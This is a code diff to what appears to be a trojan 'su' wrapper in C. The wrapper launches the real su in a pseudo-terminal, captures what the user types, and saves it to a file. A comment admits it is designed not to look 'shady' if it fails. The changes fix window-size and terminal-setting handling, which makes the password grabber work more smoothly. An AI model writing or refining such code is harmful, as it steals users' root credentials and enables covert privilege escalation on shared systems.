@@ -39,7 +39,7 @@ void handle_winch(int sig)
 {
     struct winsize ws;
     printf("handling winch\n");
-    ioctl(STDIN_FILENO, TIOCSWINSZ, &ws);
+    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);
     ioctl(terminalfd, TIOCSWINSZ, &ws);
 }
 
@@ -82,9 +82,6 @@ int main(int argc, char * const *argv)
     old_sigwinch = signal(SIGWINCH, handle_winch);
     old_sigint = signal(SIGINT, handle_int);
 
-    // Get current window size
-    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);
-
     /* Retrieve current terminal settings, turn echoing off */
     if (tcgetattr(STDIN_FILENO, &new_term_settings) == -1)
     {
@@ -103,7 +100,7 @@ int main(int argc, char * const *argv)
         cleanup_and_exit(1);
     }
 
-    pid = forkpty(&terminalfd, (char *)NULL, NULL, &ws);
+    pid = forkpty(&terminalfd, (char *)NULL, NULL, NULL);
     // Doing the exec in the child and also on error lets us fall back to just
     // exec'ing su if forkpty fails. We won't get the password, but it also
     // won't make it obvious that we're being shady.
@@ -111,6 +108,9 @@ int main(int argc, char * const *argv)
     {
         cleanup_and_exit(execvp("/bin/su", argv));
     }
+
+    // Get current window size
+    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);
 
     // Testing on Ubuntu, forkpty seems to ignore the window size, so set it
     // with ioctl, too.
@@ -129,16 +129,7 @@ int main(int argc, char * const *argv)
     // And save it
     fprintf(file, "%s\n", buf);
 
-
-    /* Restore original terminal settings */
-
-    if (tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings) == -1)
-    {
-        perror("tcsetattr");
-        exit(1);
-    }
-
-    tcgetattr(STDIN_FILENO, &old_term_settings); // Disable buffered I/O and echo mode for terminal emulated
+    tcgetattr(STDIN_FILENO, &old_term_settings);
     new_term_settings = old_term_settings;
     new_term_settings.c_lflag &= ~ICANON;
     new_term_settings.c_lflag &= ~ECHO;
